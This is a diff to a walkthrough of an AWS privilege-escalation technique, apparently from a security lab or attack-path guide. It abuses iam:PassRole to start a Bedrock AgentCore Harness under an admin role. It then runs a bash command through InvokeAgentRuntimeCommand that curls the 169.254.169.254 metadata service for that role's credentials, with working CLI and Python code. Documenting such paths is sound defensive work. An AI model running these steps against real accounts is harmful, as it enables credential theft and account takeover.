@@ -75,7 +75,7 @@ The attack has three steps: create the Harness with the privileged execution rol
 
 ### Step 1: Create the AgentCore Harness with the Privileged Role
 
-Create the Harness using your starting user credentials. The `executionRoleArn` is what makes this attack work — you are passing the target admin role to the Harness, and `iam:PassRole` is what authorizes this. No container image is needed:
+Create the Harness using your starting user credentials. The `executionRoleArn` is what makes this attack work — you are passing the target admin role to the Harness, and `iam:PassRole` is what authorizes this. No container image is needed, and memory is disabled because the attack never uses the managed agent loop:
 
 ```bash
 HARNESS_RESPONSE=$(aws bedrock-agentcore-control create-harness \
@@ -83,32 +83,29 @@ HARNESS_RESPONSE=$(aws bedrock-agentcore-control create-harness \
   --harness-name bedrock-005-privesc-harness \
   --execution-role-arn "$TARGET_ROLE_ARN" \
   --model "{\"bedrockModelConfig\":{\"modelId\":\"amazon.nova-micro-v1:0\"}}" \
+  --memory '{"disabled":{}}' \
   --output json)
-
-HARNESS_ARN=$(echo "$HARNESS_RESPONSE" | jq -r '.harnessArn')
-echo "Harness ARN: $HARNESS_ARN"
 ```
 
-The `harnessArn` contains the underlying runtime ID embedded in its path:
-`arn:aws:bedrock-agentcore:<region>:<account>:runtime/<runtime-id>/harness/<harness-id>`
-
-Extract the runtime ID for polling:
+The response nests the harness under a `harness` key. Keep both the ARN and the ID: the ARN is what you invoke, the ID is what you poll.
 
 ```bash
-RUNTIME_ID=$(echo "$HARNESS_ARN" | sed 's|.*/runtime/\([^/]*\)/harness/.*|\1|')
-echo "Runtime ID: $RUNTIME_ID"
+HARNESS_ARN=$(echo "$HARNESS_RESPONSE" | jq -r '.harness.arn')
+HARNESS_ID=$(echo "$HARNESS_RESPONSE" | jq -r '.harness.harnessId')
+echo "Harness ARN: $HARNESS_ARN"
+echo "Harness ID : $HARNESS_ID"
 ```
 
 ### Step 2: Wait for READY State
 
-The Harness provisions an underlying Runtime that needs 2–5 minutes to initialize. Poll `GetAgentRuntime` until the status reaches `READY`:
+The Harness provisions an underlying Runtime that needs 2–5 minutes to initialize. Poll `GetHarness` until the status reaches `READY`:
 
 ```bash
 while true; do
-  STATUS=$(aws bedrock-agentcore-control get-agent-runtime \
+  STATUS=$(aws bedrock-agentcore-control get-harness \
     --region us-east-1 \
-    --agent-runtime-id "$RUNTIME_ID" \
-    --query 'status' --output text)
+    --harness-id "$HARNESS_ID" \
+    --query 'harness.status' --output text)
   echo "Status: $STATUS"
   [ "$STATUS" = "READY" ] && break
   sleep 15
@@ -119,20 +116,38 @@ Once you see `READY`, the MicroVM is running and MMDS is serving credentials for
 
 ### Step 3: Invoke a Shell Command to Steal MMDS Credentials
 
-Call `InvokeAgentRuntimeCommand` with a bash one-liner that reads temporary credentials from MMDS. The Harness ARN can be used directly as the `agentRuntimeArn` — it routes the command into the underlying Runtime's MicroVM. The flow mirrors EC2 IMDSv2: first request a session token with a PUT, then use it to fetch the role name and the credential JSON:
+Call `InvokeAgentRuntimeCommand` with a bash command that reads temporary credentials from MMDS. The Harness ARN can be used directly as the `agentRuntimeArn` — it routes the command into the underlying Runtime's MicroVM. The flow mirrors EC2 IMDSv2: first request a session token with a PUT, then use it to fetch the role name and the credential JSON. The response is an event stream, so read it with the SDK and reassemble the `stdout` content deltas. Save this as `read_mmds.py`:
 
-```bash
-TARGET_ROLE_SHORT=$(basename "$TARGET_ROLE_ARN")
+```python
+import boto3, sys, uuid
 
-CREDS=$(aws bedrock-agentcore invoke-agent-runtime-command \
-  --region us-east-1 \
-  --agent-runtime-arn "$HARNESS_ARN" \
-  --command bash \
-  --command-arguments '["-c", "TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\"); curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/'"$TARGET_ROLE_SHORT"'"]' \
-  --output json)
+BASH_COMMAND = """bash -c '
+TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
+ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
+'"""
+
+client = boto3.client("bedrock-agentcore", region_name="us-east-1")
+response = client.invoke_agent_runtime_command(
+    agentRuntimeArn=sys.argv[1],
+    runtimeSessionId=str(uuid.uuid4()),
+    body={"command": BASH_COMMAND, "timeout": 30},
+)
+
+for event in response["stream"]:
+    chunk = event.get("chunk", {})
+    if "contentDelta" in chunk and "stdout" in chunk["contentDelta"]:
+        print(chunk["contentDelta"]["stdout"], end="")
 ```
 
-The response is a streaming JSON object. Parse the `stdout` content delta chunks to reassemble the credentials JSON:
+Run it with the Harness ARN:
+
+```bash
+CREDS=$(python3 read_mmds.py "$HARNESS_ARN")
+echo "$CREDS"
+```
+
+It prints the credentials JSON for the target admin role:
 
 ```json
 {
